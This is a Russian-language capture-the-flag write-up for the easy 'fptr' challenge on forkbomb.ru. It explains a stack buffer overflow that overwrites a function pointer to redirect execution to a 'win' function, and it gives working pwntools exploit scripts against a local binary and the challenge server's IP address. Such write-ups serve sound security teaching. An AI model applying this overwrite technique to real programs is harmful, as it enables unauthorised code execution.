
# Сайт: forkbomb.ru 
# Автор: @korniltsev (Anatoly Korniltsev)
# Название: fptr
# Сложность: Easy

Данное задание очень похоже на предыдущее ходом решения, однако, здесь мы затираем переменную, которая сожержит адрес функции. Посмотрим исходный код программы: <br />
![image](https://github.com/user-attachments/assets/316ac8ee-6871-4119-baf2-3c6d5c22d2bf)

Здесь все просто, считываем буфер, после того, как буфер считан, выполнится инструкция `call edx`, которая и вызовет функцию по указанному адресу: <br />
![image](https://github.com/user-attachments/assets/b1b2b4bb-6fd4-430f-9172-894eaec4c161)
Введем 4 буквы `a` и посмотрим на состояние стека: <br />
![image](https://github.com/user-attachments/assets/1667b659-cc59-4523-8f05-f55eef968786)
При таком вводе, адрес не переписывается, поэтому переполним буфер и запишем новый адрес. Посмотрим как адрес у функции `win`: <br />
![image](https://github.com/user-attachments/assets/76e938ff-5656-4813-8fbc-8ef5e46d9155)
Адрес у данной функции `0x401172`. Напишем скрипт и посмотрим получится ли получить локальный флаг: <br />

```py
from pwn import * 

p = process('./fptr')
win_addr = 0x401172
p.sendline(b"AAAAAAAA" + p64(win_addr))
p.interactive()
```
![image](https://github.com/user-attachments/assets/3c1fb947-80b9-4342-8877-bdba66f5c8e5)

```py
from pwn import *

p = remote('109.233.56.90', 11601)
win_addr = 0x401172
p.sendline(b"AAAAAAAA" + p64(win_addr))
p.interactive()
```
![image](https://github.com/user-attachments/assets/8a9d397a-944e-4fab-ad4a-c0f2d95bfd25)


